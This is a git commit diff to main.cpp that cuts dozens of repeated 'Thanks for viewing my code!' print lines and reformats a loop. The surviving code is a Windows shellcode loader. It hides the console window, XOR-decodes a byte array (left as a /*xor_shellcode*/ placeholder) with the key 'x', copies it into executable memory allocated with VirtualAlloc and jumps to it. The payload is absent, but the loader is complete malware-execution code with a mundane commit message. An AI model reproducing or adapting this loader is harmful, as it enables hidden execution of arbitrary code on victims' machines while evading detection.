631760deceae413976dd4d10d66f9399c65d8d1e
Roko191 <rokovukovic191@gmail.com>
2022-02-02 10:03:33 +0100

    Dont print so many messages and make code bit more readble

--- main.cpp
+++ main.cpp
@@ -5,57 +5,13 @@
  
 int main(int argc, char **argv) {
 	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
-	std::cout << "Thanks for viewing my code!";
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	char b[] = /*xor_shellcode*/
 	char c[sizeof b];
-	for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}
+	for (int i = 0; i < sizeof b; i++) 
+	{
+		c[i] = b[i] ^ 'x';
+	}
 	void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, c, sizeof c);
 	((void(*)())exec)();		
